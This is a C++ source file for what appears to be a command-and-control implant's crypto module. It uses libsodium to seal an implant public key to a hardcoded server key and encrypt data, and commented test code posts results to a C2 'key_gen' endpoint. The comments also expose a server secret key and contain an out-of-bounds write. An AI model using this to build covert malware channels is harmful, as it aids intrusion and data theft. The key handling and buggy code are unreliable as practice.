#include "com_crypto.hpp"
#include <iostream>
#include <string>
#include <sstream>
#include <vector>

#include "../libs/nlohmann/json.hpp"

//#include "libsodium-win64/include/sodium.h"

using json = nlohmann::json;

//using namespace std;

encryptor::encryptor(){
    std::string hex_chars_pk("e5 29 f9 d6 79 85 53 ad 6d ce 5a 9e de 09 b0 e4 09 ca 3e 2a 1d a9 67 ce 0d 7a 5a d2 41 94 63 28");
    std::istringstream hex_chars_stream_pk(hex_chars_pk);
    unsigned int c;
    int i=0;
    while (hex_chars_stream_pk >> std::hex >> c)
    {
        server_publickey[i] = c;
        i++;
    }
    crypto_box_keypair(implant_publickey, implant_secretkey);
}

std::string encryptor::convert_un_char_to_str(std::vector<unsigned char> pk){
    std::stringstream ss;
    for(int i=0;i<pk.size();i++){
        ss << std::hex << std::setw(2) << std::setfill('0') << (int) static_cast <unsigned char>(pk[i]) << ' ';
    }
    return ss.str().substr(0,ss.str().size()-1);
}

std::string encryptor::encrypt_public_key(){
    std::vector<unsigned char> ciphertext(crypto_box_SEALBYTES + 32);
    //unsigned char *ciphertext = (unsigned char *) malloc((crypto_box_SEALBYTES + 32) * sizeof(unsigned char));
    if (crypto_box_seal(ciphertext.data(),implant_publickey,32,server_publickey) != 0) {
/* error */
        std::cout << "Error" << std::endl;
    }
    for(int i=0;i<32;i++){
        std::cout << std::hex << (int) static_cast <unsigned char>(implant_publickey[i]);
    }


    
    return convert_un_char_to_str(ciphertext);
}

std::string encryptor::encrypt_data(std::string data){
    unsigned char nonce[crypto_box_NONCEBYTES];
    randombytes_buf(nonce, sizeof nonce);
    int ciphertext_length = crypto_box_MACBYTES + data.size();
    std::vector<unsigned char> text_data(data.begin(),data.end());
    std::vector<unsigned char> random_vec;

    std::vector<unsigned char> ciphertext(ciphertext_length);
        for(int i=0;i<crypto_box_NONCEBYTES;i++){
            random_vec.push_back(nonce[i]);
        }
        random_bytes = convert_un_char_to_str(random_vec);

        if (crypto_box_easy(ciphertext.data(),text_data.data(),data.size(), nonce,
                server_publickey, implant_secretkey) != 0) {
        std::cout<< "Error" << std::endl;
        }

    // string hex_chars_sk("0b ab 3b 03 83 e1 3b e4 d3 22 ae 04 b2 3e ec d5 e1 a3 bb f8 da 74 1e 36 74 12 64 60 64 37 3c d4");
    // unsigned char server_secretkey[crypto_box_SECRETKEYBYTES];
    // std::istringstream hex_chars_stream_sk(hex_chars_sk);
    // unsigned int c;
    
    // int i=0;

    // while (hex_chars_stream_sk >> std::hex >> c)
    // {
    //     server_secretkey[i] = c;
    //     i++;
    // }

    // unsigned char decrypted[20];
    // if (crypto_box_open_easy(decrypted, ciphertext.data(),ciphertext.size(), nonce,implant_publickey, server_secretkey) != 0) {

    // }
    // decrypted[20] = 0;
    // cout << decrypted << endl;
    //exit(1);
    //string a = convert_un_char_to_str(ciphertext);

    return convert_un_char_to_str(ciphertext);

}



// int main(){
//     CONFIG config;
//     std::cout<<"HAHAHAH"<<std::endl;

//     config.computer_guid = "hahahahah";
//     config.c2_fqdn = "localhost";
//     config.c2_port = 5000;
//     encryptor enc;
//     std::string s = enc.encrypt_public_key();
//     std::string s_d = enc.encrypt_data("I am good how are you");
    
    

//     json d;
//     d["computer_guid"] = config.computer_guid;
//     d["data"] = s;
//     d["extra_data"] = s_d;
//     d["nonce"] = enc.random_bytes;
//     std::cout << post(config.c2_fqdn,config.c2_port,"/key_gen",d.dump()) << std::endl;
//     return 0;
// }
//int main(){

    // unsigned char server_publickey[crypto_box_PUBLICKEYBYTES];
    // unsigned char server_secretkey[crypto_box_SECRETKEYBYTES];

    // string hex_chars_pk("e5 29 f9 d6 79 85 53 ad 6d ce 5a 9e de 09 b0 e4 09 ca 3e 2a 1d a9 67 ce 0d 7a 5a d2 41 94 63 28");
    // string hex_chars_sk("0b ab 3b 03 83 e1 3b e4 d3 22 ae 04 b2 3e ec d5 e1 a3 bb f8 da 74 1e 36 74 12 64 60 64 37 3c d4");
    // std::istringstream hex_chars_stream_pk(hex_chars_pk);
    // std::istringstream hex_chars_stream_sk(hex_chars_sk);


    // unsigned int c;
    // int i=0;
    // while (hex_chars_stream_pk >> std::hex >> c)
    // {
    //     server_publickey[i] = c;
    //     i++;
    // }
    // i=0;
    // while (hex_chars_stream_sk >> std::hex >> c)
    // {
    //     server_secretkey[i] = c;
    //     i++;
    // }



    // unsigned char implant_publickey[crypto_box_PUBLICKEYBYTES];
    // unsigned char implant_secretkey[crypto_box_SECRETKEYBYTES];
    // crypto_box_keypair(implant_publickey, implant_secretkey);

    // //crypto_box_keypair(server_publickey, server_secretkey);

    // unsigned char nonce[crypto_box_NONCEBYTES];
    // unsigned char ciphertext[CIPHERTEXT_LEN];
    // randombytes_buf(nonce, sizeof nonce);
    // if (crypto_box_easy(ciphertext, MESSAGE, MESSAGE_LEN, nonce,
    //                     server_publickey, implant_secretkey) != 0) {
    //     /* error */
    // }

    // unsigned char decrypted[MESSAGE_LEN];
    // if (crypto_box_open_easy(decrypted, ciphertext, CIPHERTEXT_LEN, nonce,
    //                         implant_publickey, server_secretkey) != 0) {
    //     /* message for Bob pretending to be from Alice has been forged! */
    // }
    // decrypted[MESSAGE_LEN] = 0;
    // cout << decrypted << endl;
//}
//g++ -std=c++17 -Llibsodium-win64\lib\ -o p.exe .\com_crypto.cpp -llibsodiu
